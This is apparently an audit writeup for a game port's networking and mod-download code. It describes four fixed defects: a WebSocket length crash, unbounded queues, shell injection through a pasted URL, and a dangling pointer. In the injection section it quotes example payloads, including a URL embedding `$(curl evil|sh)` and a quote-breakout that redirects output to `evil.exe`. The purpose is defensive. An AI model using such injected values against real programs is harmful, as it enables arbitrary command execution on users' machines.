# Remote-input validation gaps — WS frame length, download URL injection, escaping hash pointer

**FIXED 2026-10-18** (port `websocket_transport.cpp`, `download_service.cpp`, `http_download.cpp`; libultraship `ArchiveManager`)

Repository audit pass ("busca bugs, deuda técnica, cosas a medio implementar") that went past the lint-clean state into remote-facing input paths. Three confirmed defects, all in code that consumes bytes from the network or the user.

## 1. WebSocket frame length cap missed the masked-frame branch (recv-thread crash)

`recv_frame()` in `src/networking/netplay/transport/websocket_transport.cpp` decoded the 8-byte extended length, then for a **masked** server frame ran `out->assign(len, 0)` *before* the `len > 4MiB` guard — which only lived on the unmasked path. A hostile or buggy server sending a masked frame with `len = 0xFFFFFFFFFFFFFFFF` pushed the vector past `max_size()` → `std::length_error` thrown on the receive thread → uncaught → `std::terminate`. A large-but-allocatable len (e.g. 8 GiB) instead stalled the reader forever on bytes that never arrive.

- Affects the portable BSD-socket backend — i.e. **Linux / macOS / Switch** and any `SSB64_PORTABLE_WS` build. The Windows WinHTTP backend doesn't decode frame lengths itself, so it couldn't hit the same fault (its own accumulation issue below still applied).
- Exploitability: requires the client to reach a hostile lobby server (fake server, MITM on plain `ws://`, or a compromised relay). Crash-only, no memory write.

Fix: the 4 MiB cap now applies immediately after the extended-length decode, before either branch touches `out`.

## 2. Unbounded WS message reassembly and delivery queues (memory-growth DoS)

Two separate unbounded accumulators on both backends:

- `message` grew across continuation frames with no cap — a server streaming endless `fin=0` fragments (or stray continuation frames when `message_kind == -1`, which never flush) grew the vector until OOM.
- `sTextQueue` / `sBinaryQueue` had no limit (unlike the UDP transport's `kIngressCap = 2048`): a flooding server out-paced the game thread's lazy drain and grew the deques unboundedly.

Fix: `kMaxWsMessageBytes = 16 MiB` caps the reassembly buffer and `kMaxWsQueuedMessages = 4096` caps combined pending queues, on **both** the WinHTTP and portable paths. On overflow the connection fails loudly (`fail(...)`) rather than silently dropping packets — a stalled consumer means the match is already dead, and quiet drops would only hide it as a desync.

## 3. Mod-pack download URL spliced into a shell command (command/argument injection)

`StartPackInstallFromUrlAsync(url)` in `ModPackDownloader.cpp` accepts a **user-pasted** `http(s)` URL (the "install pack from link" flow) and validated only the scheme prefix. `job.url` then flowed to `DownloadStart()`, which built `curl -fLs -o "<dest>" "<url>"` and ran it through:

- POSIX: `popen("sh -c 'echo $$; exec curl ...'")` — full `/bin/sh` interpolation inside the `"..."`; a URL like `https://x/$(curl evil|sh)` executed arbitrary commands.
- Windows: `CreateProcessA` (no shell, but argv splitting) — an embedded `"` broke out of the quoting and injected extra curl arguments, e.g. `https://a/" -o evil.exe "x` redirecting output to an attacker-chosen path.

The updater's own download path already had `IsTrustedDownloadUrl()` (release-prefix + hostile-char reject) because its URLs are release-derived; the mod-pack path, whose URLs are explicitly free-form, had no equivalent gate.

Fix: `IsShellSafeUrl()` added at the sink in `download_service.cpp` (`DownloadStart`) and `http_download.cpp` (`HttpDownloadToFile`) — requires an `http(s)://` prefix and rejects `"` `'` `\` `` ` `` `$` and control/whitespace characters. Sink-side, not caller-side, so every future caller is covered.

## 4. `ArchiveManager::HashToString` returned a pointer that outlives the lock (dangling read)

`HashToString()` took `mMutex`, found `it` in `mHashes`, and returned `&it->second` — the lock released on return, so callers (`HashToCString`, the O2r/Otr/Folder archives' `LoadFile` logging, `interpreter.cpp` DL diagnostics, `SyntheticReloc.cpp`) dereferenced a `std::string*` that `ResetVirtualFileSystem()`'s `mHashes.clear()` could free concurrently (triggered by mod add/remove while resource workers are in flight).

Fix: `ResetVirtualFileSystem()` now *retires* `mHashes` — `mRetiredHashes.push_back(std::move(mHashes))` — instead of clearing it. `unordered_map` is node-based, so the move preserves every `std::string`'s address and all outstanding pointers stay valid for the manager's lifetime. No API or call-site change; memory cost is one stale table per reset (mod operations are rare).

## Audit hook

Shell command construction from *any* remote/user string (`curl`, `popen`, `CreateProcess`) needs the hostile-character gate at the sink. A `const T*` returned from inside a mutex is only as safe as the container's lifetime guarantees — node-stable storage or a retired-generations pattern closes the gap without changing signatures.
